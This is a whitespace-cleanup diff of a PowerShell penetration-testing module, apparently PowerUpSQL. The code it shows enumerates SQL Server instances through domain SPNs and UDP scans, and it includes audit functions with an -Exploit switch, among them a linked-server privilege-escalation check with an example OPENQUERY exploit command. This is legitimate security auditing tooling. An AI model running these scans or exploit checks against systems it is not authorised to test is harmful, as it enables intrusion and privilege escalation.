-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Domain account to filter for.')]
         [string]$DomainAccount,
 
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
         [switch]$CheckMgmt,
 
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
         [int]$UDPTimeOut = 3
     )
@@ -8757,12 +8762,12 @@ Function  Get-SQLInstanceDomain
         # Table for SPN output
         $TblSQLServerSpns = New-Object -TypeName System.Data.DataTable
         $null = $TblSQLServerSpns.Columns.Add('ComputerName')
-        $null = $TblSQLServerSpns.Columns.Add('Instance')        
+        $null = $TblSQLServerSpns.Columns.Add('Instance')
         $null = $TblSQLServerSpns.Columns.Add('DomainAccountSid')
         $null = $TblSQLServerSpns.Columns.Add('DomainAccount')
         $null = $TblSQLServerSpns.Columns.Add('DomainAccountCn')
-        $null = $TblSQLServerSpns.Columns.Add('Service')        
-        $null = $TblSQLServerSpns.Columns.Add('Spn')        
+        $null = $TblSQLServerSpns.Columns.Add('Service')
+        $null = $TblSQLServerSpns.Columns.Add('Spn')
         $null = $TblSQLServerSpns.Columns.Add('LastLogon')
         $null = $TblSQLServerSpns.Columns.Add('Description')
 
@@ -8775,19 +8780,19 @@ Function  Get-SQLInstanceDomain
         Write-Verbose -Message 'Grabbing SPNs from the domain for SQL Servers (MSSQL*)...'
         $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSSQL*' -SuppressVerbose | Where-Object -FilterScript {
             $_.service -like 'MSSQL*'
-        }                
+        }
 
         Write-Verbose -Message 'Parsing SQL Server instances from SPNs...'
 
         # Add column containing sql server instance
-        $TblSQLServers | 
+        $TblSQLServers |
         ForEach-Object -Process {
             # Parse SQL Server instance
-            $Spn = $_.Spn          
+            $Spn = $_.Spn
             $Instance = $Spn.split('/')[1].split(':')[1]
 
             # Check if the instance is a number and use the relevent delim
-            $Value = 0                       
+            $Value = 0
             if([int32]::TryParse($Instance,[ref]$Value))
             {
                 $SpnServerInstance = $Spn -replace ':', ','
@@ -8795,33 +8800,33 @@ Function  Get-SQLInstanceDomain
             else
             {
                 $SpnServerInstance = $Spn -replace ':', '\'
-            } 
+            }
 
-            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/', ''                             
-              
+            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/', ''
+
             # Add SQL Server spn to table
             $null = $TblSQLServerSpns.Rows.Add(
                 [string]$_.ComputerName,
-                [string]$SpnServerInstance,                
+                [string]$SpnServerInstance,
                 $_.UserSid,
                 [string]$_.User,
                 [string]$_.Usercn,
                 [string]$_.Service,
-                [string]$_.Spn,                
+                [string]$_.Spn,
                 $_.LastLogon,
-            [string]$_.Description)            
+            [string]$_.Description)
         }
 
         # Enumerate SQL Server instances from management servers
         if($CheckMgmt)
         {
-            Write-Verbose -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'        
+            Write-Verbose -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'
             $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSServerClusterMgmtAPI' -SuppressVerbose |
             Where-Object -FilterScript {
                 $_.ComputerName -like '*.*'
             } |
             Select-Object -Property ComputerName -Unique |
-            Sort-Object -Property ComputerName 
+            Sort-Object -Property ComputerName
 
             Write-Verbose -Message 'Performing a UDP scan of management servers to obtain managed SQL Server instances...'
             $TblMgmtSQLServers = $TblMgmtServers |
@@ -8831,8 +8836,8 @@ Function  Get-SQLInstanceDomain
     }
 
     End
-    {                  
-        # Return data        
+    {
+        # Return data
         if($CheckMgmt)
         {
             Write-Verbose -Message 'Parsing SQL Server instances from the UDP scan...'
@@ -8849,11 +8854,11 @@ Function  Get-SQLInstanceDomain
             $Tbl3
         }
         else
-        {                    
+        {
             $InstanceCount = $TblSQLServerSpns.rows.count
             Write-Verbose -Message "$InstanceCount instances were found."
             $TblSQLServerSpns
-        }        
+        }
     }
 }
 
@@ -8862,14 +8867,14 @@ Function  Get-SQLInstanceDomain
 # Function:  Get-SQLInstanceLocal
 # -------------------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLInstanceLocal 
+Function  Get-SQLInstanceLocal
 {
     <#
             .SYNOPSIS
             Returns a list of the SQL Server instances found in the Windows registry for the local system.
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal
-        
+
             ComputerName       : Computer1
             Instance           : Computer1\SQLEXPRESS
             ServiceDisplayName : SQL Server (SQLEXPRESS)
@@ -8893,7 +8898,7 @@ Function  Get-SQLInstanceLocal
             ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
             ServiceAccount     : NT Service\MSSQLSERVER
             State              : Running
-           
+
     #>
     Begin
     {
@@ -8909,22 +8914,22 @@ Function  Get-SQLInstanceLocal
     }
 
     Process
-    {       
+    {
         # Grab SQL Server services for the server
         $SqlServices = Get-SQLServiceLocal | Where-Object -FilterScript {
             $_.ServicePath -like '*sqlservr.exe*'
         }
-              
-        # Add recrds to SQL Server instance table        
+
+        # Add recrds to SQL Server instance table
         $SqlServices |
         ForEach-Object -Process {
             # Parse Instance
-            $ComputerName = [string]$_.ComputerName                              
-            $DisplayName = [string]$_.ServiceDisplayName                     
+            $ComputerName = [string]$_.ComputerName
+            $DisplayName = [string]$_.ServiceDisplayName
 
             if($DisplayName)
             {
-                $Instance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0] 
+                $Instance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]
                 if($Instance -like '*\MSSQLSERVER')
                 {
                     $Instance = $ComputerName
@@ -8943,19 +8948,19 @@ Function  Get-SQLInstanceLocal
                 [string]$_.ServiceName,
                 [string]$_.ServicePath,
                 [string]$_.ServiceAccount,
-            [string]$_.ServiceState)                  
+            [string]$_.ServiceState)
         }
     }
 
     End
-    {  
-        
+    {
+
         # Status User
         $LocalInstanceCount = $TblLocalInstances.rows.count
         Write-Verbose -Message "$LocalInstanceCount local instances where found."
 
         # Return data
-        $TblLocalInstances         
+        $TblLocalInstances
     }
 }
 
@@ -8973,7 +8978,7 @@ function Get-SQLInstanceScanUDP
             .PARAMETER ComputerName
             Computer name or IP address to enumerate SQL Instance from.
             .PARAMETER UDPTimeOut
-            Timeout in seconds. Longer timeout = more accurate.    
+            Timeout in seconds. Longer timeout = more accurate.
             .EXAMPLE
             PS C:\> Get-SQLInstanceScanUDP -Verbose -ComputerName SQLServer1.domain.com
             VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
@@ -9015,19 +9020,19 @@ function Get-SQLInstanceScanUDP
             TCPPort      : 51861
             BaseVersion  : 11.0.2100.60
             IsClustered  : No
-            [TRUNCATED]                
+            [TRUNCATED]
     #>
     [CmdletBinding()]
     param(
 
         [Parameter(Mandatory = $true,
                 ValueFromPipeline,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
         [string]$ComputerName,
 
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
         [int]$UDPTimeOut = 2,
 
@@ -9036,7 +9041,7 @@ function Get-SQLInstanceScanUDP
         [switch]$SuppressVerbose
     )
 
-    Begin 
+    Begin
     {
         # Setup data table for results
         $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
@@ -9046,7 +9051,7 @@ function Get-SQLInstanceScanUDP
         $null = $TableResults.columns.add('ServerIP')
         $null = $TableResults.columns.add('TCPPort')
         $null = $TableResults.columns.add('BaseVersion')
-        $null = $TableResults.columns.add('IsClustered')           
+        $null = $TableResults.columns.add('IsClustered')
     }
 
     Process
@@ -9058,8 +9063,8 @@ function Get-SQLInstanceScanUDP
 
         # Verify server name isn't empty
         if ($ComputerName -ne '')
-        {        
-            # Try to enumerate SQL Server instances from remote system             
+        {
+            # Try to enumerate SQL Server instances from remote system
             try
             {
                 # Resolve IP
@@ -9072,7 +9077,7 @@ function Get-SQLInstanceScanUDP
                 $UDPTimeOutMilsec = $UDPTimeOut * 1000
                 $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                 $UDPClient.Connect($ComputerName,0x59a)
-                $UDPPacket = 0x03  
+                $UDPPacket = 0x03
 
                 # Send request to system
                 $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
@@ -9084,14 +9089,14 @@ function Get-SQLInstanceScanUDP
                 $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')
 
                 $values = @{}
-           
+
                 for($i = 0; $i -le $Response.length; $i++)
                 {
-                    if(![string]::IsNullOrEmpty($Response[$i])) 
+                    if(![string]::IsNullOrEmpty($Response[$i]))
                     {
                         $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                     }
-                    else 
+                    else
                     {
                         if(![string]::IsNullOrEmpty($values.'tcp'))
                         {
@@ -9104,8 +9109,8 @@ function Get-SQLInstanceScanUDP
                             # Add SQL Server instance info to results table
                             $null = $TableResults.rows.Add(
                                 [string]$ComputerName,
-                                [string]"$ComputerName\"+$values.'instancename',                                
-                                [string]$values.'instancename',                                
+                                [string]"$ComputerName\"+$values.'instancename',
+                                [string]$values.'instancename',
                                 [string]$IPAddress,
                                 [string]$values.'tcp',
                                 [string]$values.'version',
@@ -9126,8 +9131,8 @@ function Get-SQLInstanceScanUDP
 
                 # Close connection
                 # $UDPClient.Close()
-            } 
-        }       
+            }
+        }
         if(-not $SuppressVerbose)
         {
             Write-Verbose -Message " - $ComputerName - UDP Scan Complete."
@@ -9137,7 +9142,7 @@ function Get-SQLInstanceScanUDP
     End
     {
         # Return Results
-        $TableResults 
+        $TableResults
     }
 }
 
@@ -9155,7 +9160,7 @@ function Get-SQLInstanceScanUDPThreaded
             .PARAMETER ComputerName
             Computer name or IP address to enumerate SQL Instance from.
             .PARAMETER UDPTimeOut
-            Timeout in seconds. Longer timeout = more accurate.    
+            Timeout in seconds. Longer timeout = more accurate.
             .PARAMETER Threads
             Number of concurrent host threads.
             .EXAMPLE
@@ -9199,7 +9204,7 @@ function Get-SQLInstanceScanUDPThreaded
             TCPPort      : 51861
             BaseVersion  : 11.0.2100.60
             IsClustered  : No
-            [TRUNCATED]                
+            [TRUNCATED]
     #>
 
     [CmdletBinding()]
@@ -9207,12 +9212,12 @@ function Get-SQLInstanceScanUDPThreaded
 
         [Parameter(Mandatory = $true,
                 ValueFromPipeline,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
         [string]$ComputerName,
 
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
         [int]$UDPTimeOut = 2,
 
@@ -9235,7 +9240,7 @@ function Get-SQLInstanceScanUDPThreaded
         $null = $TableResults.columns.add('ServerIP')
         $null = $TableResults.columns.add('TCPPort')
         $null = $TableResults.columns.add('BaseVersion')
-        $null = $TableResults.columns.add('IsClustered')  
+        $null = $TableResults.columns.add('IsClustered')
         $TableResults.Clear()
 
         # Setup data table for pipeline threading
@@ -9252,27 +9257,27 @@ function Get-SQLInstanceScanUDPThreaded
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
-            $ComputerName = $_.ComputerName     
-            
+            $ComputerName = $_.ComputerName
+
             if(-not $SuppressVerbose)
             {
                 Write-Verbose -Message " - $ComputerName - UDP Scan Start."
             }
-                                     
+
 
             # Verify server name isn't empty
             if ($ComputerName -ne '')
-            {        
-                # Try to enumerate SQL Server instances from remote system             
+            {
+                # Try to enumerate SQL Server instances from remote system
                 try
                 {
                     # Resolve IP
@@ -9285,7 +9290,7 @@ function Get-SQLInstanceScanUDPThreaded
                     $UDPTimeOutMilsec = $UDPTimeOut * 1000
                     $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                     $UDPClient.Connect($ComputerName,0x59a)
-                    $UDPPacket = 0x03  
+                    $UDPPacket = 0x03
 
                     # Send request to system
                     $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
@@ -9297,14 +9302,14 @@ function Get-SQLInstanceScanUDPThreaded
                     $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')
 
                     $values = @{}
-           
+
                     for($i = 0; $i -le $Response.length; $i++)
                     {
-                        if(![string]::IsNullOrEmpty($Response[$i])) 
+                        if(![string]::IsNullOrEmpty($Response[$i]))
                         {
                             $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                         }
-                        else 
+                        else
                         {
                             if(![string]::IsNullOrEmpty($values.'tcp'))
                             {
@@ -9317,8 +9322,8 @@ function Get-SQLInstanceScanUDPThreaded
                                 # Add SQL Server instance info to results table
                                 $null = $TableResults.rows.Add(
                                     [string]$ComputerName,
-                                    [string]"$ComputerName\"+$values.'instancename',                                
-                                    [string]$values.'instancename',                                
+                                    [string]"$ComputerName\"+$values.'instancename',
+                                    [string]$values.'instancename',
                                     [string]$IPAddress,
                                     [string]$values.'tcp',
                                     [string]$values.'version',
@@ -9339,17 +9344,17 @@ function Get-SQLInstanceScanUDPThreaded
 
                     # Close connection
                     # $UDPClient.Close()
-                } 
+                }
             }
-            
+
             if(-not $SuppressVerbose)
             {
                 Write-Verbose -Message " - $ComputerName - UDP Scan End."
             }
-        }         
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TableResults
     }
@@ -9359,11 +9364,11 @@ function Get-SQLInstanceScanUDPThreaded
 #  Get-SQLInstanceFile
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLInstanceFile 
+Function  Get-SQLInstanceFile
 {
     <#
             .SYNOPSIS
-            Returns a list of SQL Server instances from a file.  
+            Returns a list of SQL Server instances from a file.
             One per line. Three instance formats supported:
             1 - computername
             2 - computername\instance
@@ -9375,14 +9380,14 @@ Function  Get-SQLInstanceFile
             VERBOSE: Importing instances from file path.
             VERBOSE: 3 instances where found in c:\temp\servers.txt.
 
-            ComputerName   Instance                      
-            ------------   --------                      
-            Computer1      Computer1\SQLEXPRESS     
+            ComputerName   Instance
+            ------------   --------
+            Computer1      Computer1\SQLEXPRESS
             Computer1      Computer1\STANDARDDEV2014
-            Computer1      Computer1                
+            Computer1      Computer1
     #>
     [CmdletBinding()]
-    Param(        
+    Param(
         [Parameter(Mandatory = $true,
         HelpMessage = 'The file path.')]
         [string]$FilePath
@@ -9397,7 +9402,7 @@ Function  Get-SQLInstanceFile
     }
 
     Process
-    {       
+    {
         # Test file path
         if(Test-Path $FilePath)
         {
@@ -9408,7 +9413,7 @@ Function  Get-SQLInstanceFile
             Write-Output -InputObject 'File path does not appear to be valid.'
             break
         }
-              
+
         # Grab lines from file
         Get-Content -Path $FilePath |
         ForEach-Object -Process {
@@ -9421,7 +9426,7 @@ Function  Get-SQLInstanceFile
             {
                 $ComputerName = $Instance.Split('\')[0]
             }
-            
+
             # Add record
             if($_ -ne '')
             {
@@ -9431,14 +9436,14 @@ Function  Get-SQLInstanceFile
     }
 
     End
-    {  
-        
+    {
+
         # Status User
         $FileInstanceCount = $TblFileInstances.rows.count
         Write-Verbose -Message "$FileInstanceCount instances where found in $FilePath."
 
         # Return data
-        $TblFileInstances         
+        $TblFileInstances
     }
 }
 #endregion
@@ -9478,44 +9483,44 @@ Function  Get-SQLInstanceFile
 # ---------------------------------------
 # Author: Scott Sutherland
 # Note: This is just a template for building other escalation functions.
-Function Invoke-SQLAuditTemplate 
+Function Invoke-SQLAuditTemplate
 {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -9526,15 +9531,15 @@ Function Invoke-SQLAuditTemplate
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: [VULNERABILITY NAME]" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: [VULNERABILITY NAME]"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -9544,7 +9549,7 @@ Function Invoke-SQLAuditTemplate
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]."
             Return
         }
         else
@@ -9553,13 +9558,13 @@ Function Invoke-SQLAuditTemplate
         }
 
         # Grab server information
-        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
+        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential
         $CurrentLogin = $ServerInfo.CurrentLogin
         $ComputerName = $ServerInfo.ComputerName
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -9567,50 +9572,50 @@ Function Invoke-SQLAuditTemplate
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = ''
         $Description   = ''
         $Remediation   = ''
-        $Severity      = '' 
+        $Severity      = ''
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = "[CurrentCommand] -Instance $Instance -Exploit"
-        $Details       = ''   
-        $Reference     = ''       
-        $Author        = 'First Last (Twitter), Company Year' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = ''
+        $Author        = 'First Last (Twitter), Company Year'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
-        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes" 
+        # -----------------------------------------------------------------
+        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes"
 
-        
-        # -----------------------------------------------------------------     
-        # Check for exploit dependancies 
+
+        # -----------------------------------------------------------------
+        # Check for exploit dependancies
         # Note: Typically secondary configs required for dba/os execution
         # -----------------------------------------------------------------
         # $IsExploitable = "No" or $IsExploitable = "Yes"
 
 
-        # -----------------------------------------------------------------    
+        # -----------------------------------------------------------------
         # Exploit Vulnerability
         # Note: Add the current user to sysadmin fixed server role
-        # -----------------------------------------------------------------        
-        # $Exploited = "No" or $Exploited     = "Yes" 
-                       
-            
+        # -----------------------------------------------------------------
+        # $Exploited = "No" or $Exploited     = "Yes"
+
+
         # Add to report example
-        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)            
+        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
 
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -9620,31 +9625,31 @@ Function Invoke-SQLAuditTemplate
 
 
 # ---------------------------------------
-# Invoke-SQLAuditPrivServerLink 
+# Invoke-SQLAuditPrivServerLink
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAuditPrivServerLink 
+Function Invoke-SQLAuditPrivServerLink
 {
     <#
             .SYNOPSIS
             Check if any SQL Server links are configured with remote credentials.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
             .PARAMETER Exploit
             Exploit vulnerable issues.
             .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivServerLink -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Invoke-SQLAuditPrivServerLink -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName  : SQLServer1
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : Excessive Privilege - Linked Server
-            Description   : One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote 
+            Description   : One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote
             server.
             Remediation   : Configure SQL Server links to connect to remote servers using the login's current security context.
             Severity      : Medium
@@ -9656,44 +9661,44 @@ Function Invoke-SQLAuditPrivServerLink
             Reference     : https://msdn.microsoft.com/en-us/library/ms190479.aspx
             Author        : Scott Sutherland (@_nullbind), NetSPI 2016
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivServerLink -Verbose 
+            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivServerLink -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -9704,15 +9709,15 @@ Function Invoke-SQLAuditPrivServerLink
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Server Link" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Server Link"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -9722,7 +9727,7 @@ Function Invoke-SQLAuditPrivServerLink
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link."
             Return
         }
         else
@@ -9735,9 +9740,9 @@ Function Invoke-SQLAuditPrivServerLink
         $CurrentLogin = $ServerInfo.CurrentLogin
         $ComputerName = $ServerInfo.ComputerName
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -9745,13 +9750,13 @@ Function Invoke-SQLAuditPrivServerLink
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Excessive Privilege - Linked Server'
         $Description   = 'One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote server.'
         $Remediation   = "Configure SQL Server links to connect to remote servers using the login's current security context."
-        $Severity      = 'Medium' 
+        $Severity      = 'Medium'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'There is not exploit available at this time.'
         if($Username)
@@ -9762,14 +9767,14 @@ Function Invoke-SQLAuditPrivServerLink
         {
             #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Exploit"
         }
-        $Details       = ''   
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms190479.aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms190479.aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
+        # -----------------------------------------------------------------
 
         # Select links configured with static credentials
         $LinkedServers = Get-SQLServerLink -Verbose -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -9779,19 +9784,20 @@ Function Invoke-SQLAuditPrivServerLink
         # Update vulnerable status
         if($LinkedServers)
         {
-            $IsVulnerable  = 'Yes'             
-            $LinkedServers | 
+            $IsVulnerable  = 'Yes'
+            $LinkedServers |
             ForEach-Object -Process {
                 $Details = 
                 $LinkName = $LinkedServers.DatabaseLinkName
                 $LinkUser = $LinkedServers.RemoteLoginName
                 $LinkAccess = $LinkedServers.is_data_access_enabled
                 $ExploitCmd = "Example query: SELECT * FROM OPENQUERY([$LinkName],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')"
-                
